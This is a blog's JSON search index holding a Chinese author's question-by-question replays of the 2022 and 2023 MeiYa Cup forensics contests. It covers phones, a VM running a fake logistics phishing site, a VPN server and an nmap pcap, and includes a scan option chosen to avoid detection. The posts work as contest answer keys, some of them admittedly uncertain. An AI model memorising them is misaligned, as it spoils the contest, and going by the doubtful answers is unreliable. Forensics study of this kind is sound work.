{"meta":{"title":"Dr4x3zz","subtitle":"","description":"这是我的专属博客","author":"Dr4x3zz","url":"https://Dr4x3zz.github.io","root":"/"},"pages":[{"title":"所有分类","date":"2024-10-14T09:54:47.792Z","updated":"2022-09-24T15:06:46.000Z","comments":true,"path":"categories/index.html","permalink":"https://dr4x3zz.github.io/categories/index.html","excerpt":"","text":""},{"title":"我的朋友们","date":"2024-10-14T09:54:47.799Z","updated":"2022-09-24T16:40:06.000Z","comments":true,"path":"friends/index.html","permalink":"https://dr4x3zz.github.io/friends/index.html","excerpt":"各路神仙好友","text":"各路神仙好友 期待结交更多好友"},{"title":"所有标签","date":"2024-10-14T09:54:47.804Z","updated":"2022-09-24T15:07:04.000Z","comments":true,"path":"tags/index.html","permalink":"https://dr4x3zz.github.io/tags/index.html","excerpt":"","text":""},{"title":"","date":"2024-10-14T09:54:47.785Z","updated":"2022-09-24T15:05:24.000Z","comments":true,"path":"about/index.html","permalink":"https://dr4x3zz.github.io/about/index.html","excerpt":"","text":"下面写关于自己的内容"}],"posts":[{"title":"MeiYa2022-Individual","slug":"MeiYa2022-Individual","date":"2024-11-03T14:53:39.000Z","updated":"2024-11-08T10:13:51.403Z","comments":true,"path":"2024/11/03/MeiYa2022-Individual/","link":"","permalink":"https://dr4x3zz.github.io/2024/11/03/MeiYa2022-Individual/","excerpt":"","text":"复现一下，准备一下 2024 的美亚 学习链接： 1、2022 美亚杯个人赛 - XDforensics-Wiki 2、https://blog.csdn.net/wow0524/article/details/128025410 3、2022 美亚个人赛复盘_2022 美亚杯 容器密码 - CSDN 博客 # 1.[单选题] 王晓琳在这本电子书籍里最后对哪段文字加入了重点标示效果 (Highlight)?(2 分) A. 卿有何妙计 B. 宝玉已是三杯过去了 C. 武松那日早饭罢 D. 就除他做个强马温罢 1A 搜索 book 看看相关程序，电子书应该就和这个有关吧，跳转源文件看看 在该目录下有一个数据库文件 可以看到是三国演义，然后就没有什么有用的信息了，再看看别的文件夹 在这个路径下有一个数据库文件 # 2.[多选题] 王晓琳的手机里有一个 MTR Mobile (港) 的手机程序 (Mobile App)。 检视其数据库 (Database) 的数据，王晓琳于 2022 年 10 月 11 日 22:04 时将一行程加入书签 (Bookmark)，这段行程的起点及终点站包括？(2 分) A. 尖沙咀 B. 红硒 C. 康城 D. 青衣 E. 沙田 1DE 搜索 mtr 转到源文件，找到 E_Tourist.db 打开数据库文件，可以发现有一个时间戳和 is_bookmark，如果后者的值为 1，应该就是加入到书签，所以范围缩小到两个，查一下 2022-10-11 22:04:00 的时间戳是 1665497040 所以为青衣和沙田 # 3.[填空题] 王晓琳于 2022 年 10 月 2 日使用她的手机拍摄了多少张的照片？(以拉伯数字回答)(1 分) 190 过滤一下，他说的是拍摄，苹果手机拍摄出来的格式是 HEIC，过滤一下文件名，但是本题过滤完日期都是 HEIC 的照片 # 4.[单选题] 检视王晓琳的手机照片，她于 2022 年 10 月 2 日到过什么地方？(1 分) A. 大潭郊游径 B. 城门畔塘径 C. 大榄麦理浩径 D. 京士柏卫理径 1B 没啥好说的直接找 # 5.[单选题] 李大辉使用的是一台 LG V10 的手机，它的型号是什么？(1 分) A. LGH960C B. LGH961N C. LGH960H D. LGH961C E. LGH961D 1B # 6.[单选题] 李大辉的手机最常搜索的类别 (Category) 是什么？(1 分) A. 护肤品 B. 旅游 C. 运动 D. 学校 1A # 7.[填空题] 李大辉最近光顾了一家美丰快运公司，这快递件的单号是什么？(不要输入符号及空白，以阿拉伯数字回答)(1 分） 14567567812344567 是谷歌相册的缓存图片，看别的 wp 好像是邮件的附件，火眼好像看不了邮件内容，然后美亚的手机大师没有附件然后邮件内容全是我放案件的路径，什么内容都没有。。。 只能用最原始的方法找出来了，参考西电的 wp # 8.[单选题] 李大辉收到的电邮中有一个钓鱼链结 (Phishing Link)，这个链结的地址是什么？(1 分) A. 以上皆非 B. https://bit.ly/3yeARcO C. https://bit.ly/5vM12 D. http://bit.ly/Hell0 1B 美亚手机大师查看邮件内容 # 9.[单选题] 承上题，这封电邮是从哪个电邮地址寄出的？(1 分) A. 以上皆非 B. Cavinchow456@yahoo.com C. 2020ChanChan@hotmail.com D. 30624700Peter@proton.me 1D 同上 # 10.[单选题] 承上题，寄出这封电邮的 IP 地址是？(2 分) A. 以上皆非 B. 65.54.185.39 C. 10.13.105.56 D. 58.152.110.218 1A 根据第二个 wp 的分析，因为这封电邮是林浚熙寄出的，结合案件的报告可以知道案情以及林浚熙的 ip # 11 [单选题] 李大辉手机有一个 orderxlsx 的档案被加密了，解密钥匙是什么？(1 分) A. 2022 Nov! B. 20221101 C. Nov2022! D. P@sswOrd! 1C 相册中可以找到，也可以把这四个依次拿去试一下就知道了 # 12.[填空题] 香港的街道上每一枝街灯都有编号。分析李大辉手机里的程序 KMB 1933，哪一枝街灯在经度 (Latitude) 22.4160270000，纬度 (Longitude) 114.2139450000 附近，它的编号是什么？(以大写英及阿拉伯数字回答)(2 分) 1CE1453 搜索 kmb 定位到包，连接数据库搜索经纬度 可以定位到这一行， SC02-S-1100-0 我感觉应该是分区的编号，灯柱的编号应该是 CE1453 # 13.[填空题] 李大辉的手机里有一张由该手机拍的照片，照片的元资料 (Metadata) 曾被修改，这张照片的档案名是什么？(以大写英文及数字回答，不用回答副档名)(2 分) 120220922_152622.jpg 清晰 # 14.[单选题] 分析李大辉的手机里的资料，他在哪一间公司工作？(2 分) A. 美丽好化妆品公司 B. 步步高贸易公司 C. 盛大国际有限公司 D. 永恒化妆品公司 1A # 15.[填空题] 林浚熙曾经以手机登录 Google 账户的验证码是什么？(不要输入符号，以大写英文及阿拉伯数字回答)(1 分) 服了，检材好像坏了，林浚熙的手机导入之后检测不到，先跳过了，先练别的 # 16.[填空题] 林浚熙手机的 WhatsApp’ 号码是什么？(号码)@s.whatsapp.net? (以阿拉伯数字回答)(1 分) # 17.[单选题] 通过分析林浚熙手机的照片，判断他在何处偷拍王晓琳？(1 分) # 18.[填空题] 林浚熙曾经删掉自己拍摄的照片，这张照片的档案名 (Filename) 是什么？(不要输入，以大写英文及阿拉伯数字回答。如 Cat10.jpg，需回答 CAT10JPG)(2 分) # 19.[填空题] 王晓琳曾经发送一个 PDF 档案予林浚熙，这个档案的文件签名 (File Signature) 是什么？(以十六进制数字答首八位数值，如 FOA1C5E1)(2 分) # 20.[填空题] 承上题，该 PDF 档案内包含一位曾经被肩的受害者资料。分析林熙手机的数据，这位受害者的英文名字是什么？(不要输入符号及空白，以大写英文回答)(2 分) # 21.[单选题] 分析林浚熙手机上的数据，他在 2022 年 10 月 17 日计划去什么地方？(2 分) A. 以上皆非 B. 荃湾站 C. 沙田站 D. 国际金融中心二期 # 22.[填空题] 承上题，上述行程的结束时间是？(如答案为 1:01:59，需回答 160159)(2 分) # 23.[填空题] 于林浚熙的手机里，在 2022 年 9 月 1 日 或以后，哪一张照片是由其他手机拍摄的，而它的档案名是什么？(不要输入，以大写英文及阿拉伯数字回答。如 Cat10.jpg，需回答 CAT10JPG)(2 分) # 24.[单选题] 根据照片的数据库 Photos.sglite 资料，哪一个栏目标题 (Column Header) 可以显示这张照片的接收方式？(2 分) A. ZRECEIVEMETHODIDENTIFIER B. ZIMPORTEDFROMSOURCEIDENTIFIER C. ZIMPORTEDBYBUNDLEIDENTIFIER D. ZRECEIVEDFROMIDENTIFIER # 25.[单选题] 承上题，这张照片通过什么方式接收？(2 分) A. 网页下载 B. 蓝牙传送 C. 以上皆非 D. WhatsApp 软件传送 E. Signal 软件传送 # 26.[填空题] 承上题，这张照片原本的档案名 (Original Filename) 是什么？不要输入，以大写英文及阿拉伯数字回答。如 Cat10,jpg，需回答 CAT10JPG)(3 分) # 27. 林浚熙手机里有一个备忘录 (Notes) 被上了锁，这个备忘录的名称是什么？(以大写英文及阿拉伯数字回答) (1 分) # 28.[填空题] 承上题，上述备忘录的内容有一串数字，它是什么？(以阿拉伯数字回答)(2 分) # 29.[单选题] 林浚熙计算机 (Computer) 的操作系统 (Operating System) 版本是什么？(1 分) A. Windows 10 Pro for Workstations 21H2 B. Windows 10 Pro 22H2 C. Windows 10 Home 21H2 D. Windows 10 Pro for Workstations 21H1 1D # 30.[填空题] 林浚照计算机安装了什么品牌的虚拟专用网络 Virtual Private Network - VPN) 软件？(不要输入符号及空白，以大写英文及阿拉伯数字回答)(1 分) 1EXPRESSVPN # 31.[填空题] 承上题，分析该虚拟专用网络的日志 (Log)，他在哪天安装该虚拟专用网络？(如答案为 2022-12-29，需回答 20221229)(2 分) 120220915 # 32.[填空题] 检视林浚照计算机的数据，他使用哪种加 mh 币 (Cryptocurrency) 以支付虚拟专用网络软件？以大写英文回答该加密货币的全名，如 BITCOIN)(1 分) 1BITCOIN # 33.[填空题] 林浚熙的加密贷钱包 (Cryptocurrency Wallet) 名称是什么？不要输入符号，以大写英文及阿拉伯数字回答 2 分) 1TELLAWIEH # 34.[多选题] 林浚熙计算机里安装了哪个浏览器 (Web Browser)? (1 分) A.Tor Browser B.Microsoft Edge C.Google Chrome D.Opera E.Internet Explorer 1ABCE # 35.[单选题] 林浚熙使用浏览器 Google Chrome’ 曾经浏览最多的是哪 个网站？(1 分) A. https://gmail.com B. https://mail.google.com/mail C. https://web.whatsapp.com D. https://facebook.com 1C 依次搜索 https://web.whatsapp.com 压倒性的最多 # 36.[多选题] 除了上述网站，林浚熙曾使用浏览器 Google Chrome’ 搜索过什么？(1 分) A. javascript 教学 B. php sql 教学 C. tor 教学 D. docker image 教学 E. electrum 教学 1BCDE 和上一题的解法一样，搜一下关键词 # 37.[单选题] 林浚照的计算机安装了一个通讯软件 Signal’，它的用户部储存路径是什么？(1 分) A.\\Users\\HEI\\AppData\\Roaming\\Signal B.\\Program Files(x86)\\Signal C.\\Users\\HEI\\Desktop\\Signal D.\\Users\\user\\Roaming\\Signal 1A # 38.[填空题] 通讯软件 Signal 采用一个档案存放用户的聊天记录，它的档案名是什么？(不要输入，以大写英文及阿拉伯数字回答。如 Cat10.jpg，需回答 CAT10JPG)(2 分) 1DBSQLITE 查看聊天记录跳转源文件 # 39.[填空题] 承上题，对上档案进行分析，林发熙的联络人当中有多少人安装了 Siqnal?(以阿拉伯数字回答)(3 分) 11 # 40.[填空题] 林浚熙在 “Signal’ 曾经与某人对话，那人的手机号码是什么？需要与区码 (Area Code) 一同答 (以阿拉伯数字 3 分) 185270711901 # 41.[多选题] 承上题，两人在 Signal’ 的对话中有些讯息 (Message) 包含附件，这些讯息的 'ID’包括？(2 分) A.5b9650fe-3bb6-4182-9900-f56177003672 B.46a8762b-78ea-49aa-a6f5-b24975ec189f C.9729bf92-ab9c-45f7-8147-66234296aele D.47233ffe-1a73-4b3d-b97c-626246ec3129 1 数据库打不开了，估计是我的检材坏了，能做的题目先做吧备赛先 # 42.[填空题] 承上题，林浚熙曾经于 2022 年 10 月 20 日账 Transfer Money) 予上述对话人士，那次眼的参考编号是什么？(以大写英文及阿拉白数字回答)(3 分) 1N91088774024 # 43.[单选题] 林浚照的计算机安装了多少台虚拟机 Virtual Machine - VM) ?(以阿拉伯数字回答)(1 分) A.4 B.1 C.2 D.3 1B # 44.[单选题] 林浚熙的计算机里的虚拟机 (VM) 存放在什么路径？(1 分) A.\\Users\\Public\\Documents \\Virtual Machines B.\\Program Files\\Virtual Machines C.\\User\\HEN\\Roaming\\Virtual Machines\\ D.\\Users\\HEN\\Documents\\Virtual Machines 1D # 45.[单选题] 虚拟机 (VM) 使用什么版本的作业系统 (Operating System) ?(1 分) A. CentOs Linux 7.5.1804 (Core) B. Ubuntu 22.04.1 LTS C. CentOS Linux release 7.6.1810(Core) D. Ubuntu 20.04.5 LTS 1D # 46.[多选题] 虚拟机 (VM) 中的文件传输服务器 (FTP Server) 有哪些用户？(2 分) A. nobody B. root C. admin D. man E. ftpuser 1BE 可以用 grep 查找关键词，看到是存在用户 ftpuser，但是看了很多师傅的 wp，root 用户也是其中一个 2022 美亚杯 资格赛 赛后复盘 题解_美亚杯 2022 团体赛答案 - CSDN 博客 # 47.[多选题] 虚拟机设置了什么网页服务器 (Web Server)? (2 分) A. NGINX B. LIGHTTPD C. WORDPRESS D. APACHE E. IIS 1AD # 48.[单选题] 网页服务器目录内有图片档案，而此档案的储存位置是？(1 分) A. /var/www/html/post/src B. /var/www/html/post/css C. /var/www/html/post/vendor D. /var/www/post 1B # 49.[单选题] 分析网页服务器的网站数据，假网站的公司名称是什么？(1 分) A. Krick Global Logistics B. Global Logistics C. Krick Post Global Logistics D. Krick Post 1C ip a 查看 ip 地址 访问，看到路径，访问下级目录 post 查看 logo # 50.[单选题] 检视假网站首页的显示，AY806369745HK 代表什么？(1 分) A. 邮件号码 B. 邮件收费号码 C. 邮件序号 D. 邮件参考号码 1A 同上 # 51.[填空题] 分析假网站的资料，当受害人经假网站输入数据后，网站会产生一个档案，它的档案名是什么？(不要输入 ‘.’，以大写英文及阿拉伯数字回答。 如 Cat10.jpg，需回答 CAT10JPG) (2 分) 1VUTXT 代码审计 process.php 文件 resultFile 即保存的文件是 vu.txt # 52.[多选题] 分析假网站档案，process.php’ 源码 (Source Code), 推测此档案的用途可能是？(2 分) A. 改变函数 B. 产生档案 C. 发出邮件 D. 更新数据库 1BC # 53.[填空题] 检视档案 process.php’ 源码，林浚照的电邮密码是？(以大写英文回答)(1 分) 1RTATSCEUCPACOCBDACS 如上图 # 54.[多选题] 分析档案 process.php’ 源码，它不会收集哪些资料？(2 分) A. GPS 位置 B. 信用卡号码 C. 短讯验证码 D. 电话号码 E. 电邮地址 1ACD # 55.[填空题] 虚拟机 (VM) 安装了 Docker 程序，列出一个以 5 作为开端的 Doker&quot; 镜像 mage) ID (以阿拉伯数字及大写英文回答)（2 分) 15d58c024174dd06df1c4d41d8d44b485e3080422374971005270588204ca3b82 网探勘验连接 # 56.[填空题] Docker 容器 (Container) mysql’ 对外开放的通讯端口 (Port) 是？(3 分) 143306 docker start ca0 启动 docker docker ps -a 查看 # 57.[填空题] Docker 容器 mysql，用户 root’ 的密码是？(以大写英文及阿拉伯数字回答)(2 分) 12WSX3EDC # 58.[填空题] Docker 容器，mysql 里哪一个数据库储存了大量个人资料？(以大写英文回答)(3 分) 1 网探连接 # 59.[填空题] 检视 Docker 容器’mysql’ 内数据库里的资料，李大辉的出生日期是？(如答案为 2022-12-29，需答 20221229) (3 分) 119850214 ctrl+f sql 语句 # 60.[多选题] 通过取证调查结果进行分析 (包括但不限于以上问题及情节)，林浚熙的行为涉及哪一种罪案？(5 分) A. 勒索金钱 B. 抢劫 C. 购买毒品 D. 传送儿童色情物品 E. 诈骗 1C 购买毒品 # 61.[填空题] 王晓琳手机的 MEID 号是什么？(以阿拉伯数字回答)(1 分) 1352978115584444 # 62.[多选题] 王晓琳的手机安装了什么即时通讯软件 (lnstant Messaging Apps)?(1 分) A. Signal B. 微信 (WeChat) C. QQ D. WhatsApp E. LINE 1ABD # 63.[单选题] 王晓琳于什么日子和时间曾经通过即时通讯软件发出一个 PDF 档案？(以时区 UTC+8 回答)(1 分) A.2022-09-30 17:39:53 B.2022-10-01 17:39:53 C.2022-09-30 18:30:28 D.2022-10-01 16:30:22 1A 另一个看着像论文而不是档案 # 64.[填空题] 承上题，这个 PDF 档案的 MD5 哈希值 Hash Value) 是什么？(以大写英文及阿拉伯数字回答)(1 分) 1AE0D6735BBE45B0B8F1AB7838623D9C8 右击直接计算 # 65.[单选题] 王晓琳将这个 “PDF 档案发给哪一个用户，而该用户的手机号码是什么？(1 分) A.85297663607 B.85259308538 C.85269707307 D.85246427813 1B 找一下 WhatsApp 的聊天记录 # 66.[多选题] 王晓琳发出这个，PDF 档案的原因是什么？(1 分) A. 寻求协助 B. 分享档案内容 C. 错误发出 D. 无法开启 1AD # 67.[单选题] 承上题，分析王晓琳与上述用户的对话，他们的关系是什么？(1 分) A. 客户 B. 师生 C. 家人 D. 同事 1D # 68.[单选题] 王晓琳于何时要求上述用户删除 张照片？(1 分) A. 2022-10-06 B. 2022-09-28 C. 2022-09-30 D. 2022-10-03 1D # 69.[单选题] 承上题，该用户向王晓琳提出什么要求以删除这张照片？(1 分) A. 金钱 B. 毒品 C. 性服务 D. 加密货币 1A 同上 # 70.[单选题] 王晓琳的手机里有什么电了书籍 (Electronic Book) ?(2 分) A. 三国演义 B. 红楼梦 C. 水浒传 D. 西游记 1A 看第一题，首尾呼应了","categories":[{"name":"取证","slug":"取证","permalink":"https://dr4x3zz.github.io/categories/%E5%8F%96%E8%AF%81/"}],"tags":[{"name":"取证","slug":"取证","permalink":"https://dr4x3zz.github.io/tags/%E5%8F%96%E8%AF%81/"}]},{"title":"MeiYa2023_Individual","slug":"MeiYa2023-Individual","date":"2024-10-20T08:50:27.000Z","updated":"2024-11-08T09:46:45.184Z","comments":true,"path":"2024/10/20/MeiYa2023-Individual/","link":"","permalink":"https://dr4x3zz.github.io/2024/10/20/MeiYa2023-Individual/","excerpt":"","text":"复现一下，准备一下 2024 的美亚 参考： 官方传送门：历年赛题及解析 - 美亚杯 1、2023 美亚杯个人赛全题目复盘_数据安全竞赛复盘 - CSDN 博客 2、23 美亚个人赛复盘（实操题）_2023 美亚资格赛复盘 - CSDN 博客 3、2023 第九届 “美亚杯” 全国电子数据取证竞赛个人赛实操部分参考 wp 4、2023 美亚杯 个人资格赛 wp 复盘_2023 解压密码 个人赛 美亚杯 全国电子数据取证大赛 - CSDN 博客 5、2023 第九届 “美亚杯” 全国电子数据取证竞赛个人赛实操部分参考 wp | CTF 导航 # 1. [填空题] 李大辉所用手机移动运营商公司的名称是什么？提示：请所有字母都用大写英文 (1 分) 1DUCK 火眼一把梭 # 2. [单选题] 李大辉的手机安装了什么即时通讯软件？ (1 分) A. WhatsApp B. LINE C. 微信 D. Signal E. QQ 1A 其实微信和 WhatsApp 都有，但这是单选题，所以就选择 WhatsApp 了 # 3. [填空题] 参考’Android.bin’回答以下题目李大辉的手机安装了什么反追踪软件？提示：所有答案字母都用小写字母并用 xxx_xxx_xxxxxxx_xxxxxx_xxxx 格式作答 1air_tag_tracker_detect_lite 官方答案真不知道从哪里找，复现的时候觉得下面这个更合理 查了一下 Exif 是什么？ Exif 就是用来记录拍摄图像时的各种信息：图像信息（厂商，分辨率等），相机拍摄记录（ISO，白平衡，饱和度，锐度等），缩略图（缩略图宽度，高度等），gps（拍摄时的经度，纬度，高度）等，将这些信息按照 JPEG 文件标准放在图像文件头部。 所以 exif 的修改器可以算作是反追踪软件 # 4.[单选题] 参考’Android.bin’回答以下题目，李大辉的手机是什么时间成功登入 WhatsApp？ A. 2022-08-18_21:52:30 B. 2022-08-19_21:56:23 C. 2022-08-18_21:56:37 D. 2022-08-19_06:59:07 E. 2022-08-19_07:01:17 1C 结合收到注册或者登录验证码来推断，不可能同秒登录，所以选 C # 5. [填空题] 参考’Android.bin’回答以下题目，李大辉登入 WHATSAPP 时的认证短码是什么？提示：请以阿拉伯数字作答 1304313 同上 # 6. 参考’Android.bin’回答以下题目，李大辉到美丽好化妆品公司的入职时间是何时？ A. 2016-04-16 B. 2016-06-28 C. 2017-05-25 D. 2017-07-25 E. 2017-08-18 1C 在 excel 中找到职员证，上面写着入职日期 2017-05-25 # 7. 参考’Android.bin’回答以下题目，李大辉曾于什么时间使用了图像编辑软件？ A. 2022-09-10 B. 2022-09-12 C. 2022-10-05 D. 2022-11-10 E. 2022-11-13 1D 答案是 11 月 10 日，但是找到的都是十月修改的图片 # 8. 参考 Server 文件夹下的’Meiya_VPN.vmdk’回答以下题目，这个访问服务器使用了哪个端口？提示：请用阿拉伯数字作答 1943 可以看到端口 943 # 9. 参考 Server 文件夹下的’Meiya_VPN.vmdk’回答以下题目，“User1” 账户最近连接到这个访问服务器时使用的 IP 地址是多少？提示：用 IPV4 格式回答 1192.166.244.167 在 var/log 下的 openvpnas.log 里 ctrl+f 搜索 user1 # 10. [多选题] 参考 Server 文件夹下的’Meiya_VPN.vmdk’回答以下题目，哪些文件可以找出这个访问服务器的 Ubuntu 版本？ A. lsb-release B. issue.net C. profile D. console 1AB 仿真看一下，在 /etc/ 目录下，也可以用取证大师看 # 11.[多选题] 哪些文件有助于分辨这是一个存储服务器？(1 分) A. auth.log B. sys.log C. bash_history D. idconfig 1ABC gpt 给出如下回答 1234567891011121314151617A. auth.log作用: auth.log 是身份验证相关的日志文件，通常位于 /var/log/auth.log（在某些系统如 Ubuntu 中）。它记录了所有与身份验证相关的活动，如登录尝试、SSH登录、sudo操作等。应用场景: 该文件可以帮助系统管理员了解服务器的访问行为，特别是在安全审计时。虽然它不能直接反映服务器是否是存储服务器，但它可以记录用户对存储系统的访问尝试、文件操作权限管理等信息。如果服务器是存储服务器，频繁的用户访问记录可能有助于识别。B. sys.log作用: sys.log 是系统日志文件，通常位于 /var/log/syslog。它记录了系统启动、服务状态、硬件信息、系统错误、网络设备连接等多种系统级事件。应用场景: 在存储服务器中，sys.log 可以包含硬盘挂载信息、文件系统错误、RAID阵列状态、网络存储设备（如 NAS）连接信息等。因此，该日志文件非常有可能记录存储相关的操作，帮助判断该服务器是否承担了存储功能。C. bash_history作用: bash_history 文件位于用户的主目录中（通常为 ~/.bash_history），它记录了用户在 Bash Shell 中执行的历史命令。应用场景: 通过查看 bash_history，你可以看到用户使用过的命令。这可能包括与存储相关的命令，如 mount、df、du 等操作存储设备的命令，但这取决于用户的行为。因此，它不能直接标明服务器的类型，只能作为一个辅助线索。D. idconfig作用: idconfig 并不是一个标准的 Linux 文件或命令，可能是一个拼写错误。如果假设它是 ifconfig，那么 ifconfig 是网络配置工具，用于显示或配置网络接口。应用场景: 如果服务器涉及网络文件系统（如 NFS 或 SMB），则网络配置可能与存储系统有关。但 ifconfig 更常用于诊断网络问题，和存储服务器的关联性较弱。总结：auth.log 和 sys.log 是最有可能帮助你判断服务器是否为存储服务器的文件，因为它们可能包含与存储相关的访问记录或系统事件。bash_history 提供的线索取决于用户的操作，不能直接标识服务器的用途。idconfig（假设是ifconfig）更多与网络相关，和存储服务器的直接关联性较弱。希望这些信息帮助你理解这些文件的具体作用！ # 12. 参考 Server 文件夹下的’Meiya_VPN.vmdk’回答以下题目这个访问服务器所在时区是哪个时区？ A. UTC +9 B. UTC +8 C. UTC -7 D. UTC 1C 由 /etc/timezone 可知， America/Los_Angeles 也可以在取证大师中找到 # 13. 参考 Server 文件夹下的 ’ Meiya_VPN.vmdk ’ 回答以下题目，这个访问服务器的 “openvpn” 帐户密码是多少？提示：请用大写字母与阿拉伯数字作答 1TLFAG6L6DSSC 搜索 openvpn 在 vpn1.txt 可以找到 或者在 /usr/local/openvpn_as 目录找到 init.log ，为 openvpn 的初始化日志，在其中筛选 password cat init.log | grep password # 14. 参考 Server 文件夹下的 ’ Meiya_VPN.vmdk ' 回答以下题目，在这个访问服务器中，“User1” 账户之间的连接所使用的加密算法（密码）是什么？ A. Blowfish-CBC B. 3DES-CBC C. AES-128-GCM D. AES-256-CBC 1D 取证大师搜索 user1，在 User1.ovpn 文件中找到 也可以仿真下来找找在 downloads 里 # 15. 参考’ 网络题目.pcapng ’ 文件回答以下题目，给出正在进行 Nmap 扫描的计算机互联网协议地址？提示：以 IPV4 格式给出答案 1192.168.186.132 答案是 192.168.226.132？？？？？？不懂 # 16. 参考’网络题目.pcapng’文件回答以下题目，有多少个 Nmap 扫描正在同时进行？提示：请给出阿拉伯数字作答 12 192.168.186.132 扫 8.8.8.8（TCP） 192.168.186.132 扫 45.33.32.156（UDP） # 17. 参考’网络题目.pcapng’文件回答以下题目，当计算机正在扫瞄 8.8.8.8，namp 相关的指令是什么？ A. nmap -sT 8.8.8.8 B. nmap -sU 8.8.8.8 C. nmap -sn -PR 8.8.8.8 D. nmap -sn -PU 8.8.8.8 1A gpt 回答 TCP SYN 扫描（-sS）： Nmap 发送的 SYN 数据包类似于 TCP 三次握手中的初始 SYN 数据包。 目标端口打开时，目标主机会回应一个 SYN/ACK 数据包。 目标端口关闭时，目标主机会发送 RST（复位）数据包。 Nmap 在收到 SYN/ACK 后不会完成握手，而是发送 RST 以终止连接。 TCP 全连接扫描（-sT）： Nmap 发送标准的三次握手数据包（SYN、SYN/ACK、ACK），完成 TCP 连接。 如果目标端口打开，Nmap 会建立完整的 TCP 连接，并立即关闭连接。 如果目标端口关闭，Nmap 会收到 RST 响应。 UDP 扫描（-sU）： Nmap 发送空的 UDP 数据包到目标端口。 如果端口关闭，通常会收到一个 ICMP “端口不可达” 的数据包（类型 3，代码 3）。 如果端口打开且没有响应，则通常没有回包，这让 UDP 扫描变得更难以分析。 TCP ACK 扫描（-sA）： Nmap 发送带有 ACK 标志的数据包，而不关心目标端口是否开放。 目标主机会根据是否存在防火墙来决定是否回应 RST 包。如果有防火墙，可能会丢弃数据包而无响应。 FIN 扫描（-sF）： Nmap 发送带有 FIN 标志的数据包，而不是 SYN。 如果端口关闭，目标主机通常会响应 RST。 如果端口打开，理论上不应有任何响应。 Xmas 扫描（-sX）： Nmap 发送具有 FIN、PSH 和 URG 标志的特殊数据包，类似于 “圣诞树” 的形状（故名）。 响应与 FIN 扫描类似。 NULL 扫描（-sN）： Nmap 发送一个没有设置任何 TCP 标志位的空数据包。 关闭的端口通常会返回 RST，打开的端口则不应有响应。 可以看到 tcp 扫描是 - sT # 18. 参考’网络题目.pcapng’文件回答以下题目，当计算机正在扫瞄 45.33.32.156，namp 相关的指令是什么？ A. nmap -sT 45.33.32.156 B. nmap -sU 45.33.32.156 C. nmap -sn -45.33.32.156 D. nmap -sn -45.33.32.156 1B 同上 # 19. [单选题] 国强被指派设定一个 DHCP 服务器，该服务器需借出最后 100 个的 IP 地址，以下哪个 IP 地址会是被借出的 IP 地址？(1 分) A. 10.1.4.255 B. 10.1.4.100 C. 10.1.4.254 D. 10.1.4.1 1C gpt 回答 1234567设定 DHCP 服务器借出最后 100 个 IP 地址时，通常指的是从某个范围的 IP 地址池的最后 100 个可用地址开始分配。假设 DHCP 服务器分配的 IP 地址在 10.1.4.0/24 网段中，该网段的有效 IP 地址范围是 10.1.4.1 到 10.1.4.254，其中 10.1.4.255 是广播地址，不能分配。所以，最后 100 个 IP 地址将从 10.1.4.155（254-100+1=155）到 10.1.4.254。根据选项，唯一属于最后 100 个可用 IP 地址范围内的是 C. 10.1.4.254。答案：C. 10.1.4.254。 # 20. [单选题] 以下那个协议是属于 TCP/IP 协议？(1 分) A. i &amp; iii B. ii &amp; iv C. 所有皆是 (All answers belong to TCP/IP protocol) D. 所有皆否 (All answers don’t belong to TCP/IP protocol) 1B 来源：https://www.cnblogs.com/crazymakercircle/p/14499211.html # 21. [单选题] 浩贤为一间公司的网络管理员，他需要把一个路由器作出以下设定，现在浩贤把路由器作以下设定，志伟是浩贤的主管，他发现浩贤的设定错误，浩贤应作怎样的更正？(2 分) A. 'access-list 123 permit tcp any eq ftp any ’ 更正为 (change) 'access-list 123 permit udp any eq ftp any ’ B. 'access-list 122 permit tcp host 192.168.26.3 eq www any ’ 更正为 (change) 'access-list 122 permit udp host 192.168.26.3 eq www any ’ C. 删除 (Delete)‘access-list 120 deny tcp any any’ 与’access-list 119 deny udp any any’ D. 删除 (Delete)'access-list 123 permit tcp any eq ftp any ’ 1C 1.ACL 规则的顺序：路由器会按照 ACL 中的顺序检查每一条规则，一旦找到匹配的规则，就会停止检查，因此更具体的规则应该放在前面，更通用的规则应该放在后面。 2. 如果一个数据报没有匹配任何规则，路由器会默认允许该数据包通过。 119 和 120 两个规则直接把服务器断网了，所以删掉。 # 22. [单选题] 根据以下 ping 指令的结果，你会估计 192.168.186.132 是哪一个操作系统？(2 分) A. Linux B. Windows XP C. Windows 7 D. iOS 12.4 (Cisco Routers) 1A ttl=64 即 linux # 23. [单选题] 当使用 nmap 扫瞄目标后，nmap 内出现以下信息，应用哪一个指令找出开放的端口？(2 分) A. nmap -sT B. nmap -sN C. nmap -sX D. nmap -Pn 1D # 24.[单选题] 以下哪一个 Nmap 指令可以减低被侦测的可能性？(2 分) A. nmap -sT -O -T5 B. nmap -sT -O -T0 C. nmap -sU D. nmap -A --host-timeout 99-T1 1B -T0 是最慢的扫描 # 25. [单选题] Apple 计算机的硬盘可以使用以下分区方案：(1 分) A. Apple Partition Map B. GUID Partition Table C. Master Boot Record D. All of the above 1D 看看 gpt 的回答 Apple 计算机的硬盘可以支持多种分区方案： Apple Partition Map (APM)：早期 PowerPC 架构的 Mac 计算机使用的分区方案，现代 Intel 或 Apple Silicon Mac 一般不使用。 GUID Partition Table (GPT)：现代 Mac 系统默认的分区方案，适用于较新设备。 Master Boot Record (MBR)：用于兼容一些旧系统或 Windows 环境，支持在 Mac 上创建，但不是 macOS 默认的分区方案。 所以选 D # 26. [单选题] ‘Mac OS.img’ 文件中可以找到多少个符号链接？(1 分) A. 0 B. 1 C. 2 D. 3 1B 挂载到 mac 虚拟机 搜索可知 macOS 上的符号链接 Symlink 是什么，以及该怎么使用_symbolic links-CSDN 博客: macOS 上的符号链接 Symlink 是什么，以及该怎么使用？ 符号链接（Symbolic links），也被称为 Symlinks，是一类特殊的文件，指向系统上的其他文件或者目录，可以认为是 macOS 上的一种比较先进的别名（aliase）。 由图可知只有一个 alias, 即一个连接符号 # 27. [单选题] 在’Mac OS.img’ 档中使用了哪种分区方案？(2 分) A. Apple Partition Map B. GUID Partition Table C. Master Boot Record D. HFS+ 1D 取证大师摘要 # 28. [单选题] ‘Mac OS.img’ 档的文件系统的正确描述是什么？(1 分) A. HFS+（已启用日志记录） B. HFS+（已启用区分大小写） C. HFS+（已启用日志记录和区分大小写） D. APFS (已启用区分大小写） 1C 挂载到 mac 虚拟机查看简介 # 29. [填空题] 从文件 “Car.rtfd” 中删除了哪个文件？提示：答案需包括副文件名，并以全小写字母作答，例如 answer.docx (1 分) 1yeah.jpg .DocumentRevisions-V100 是 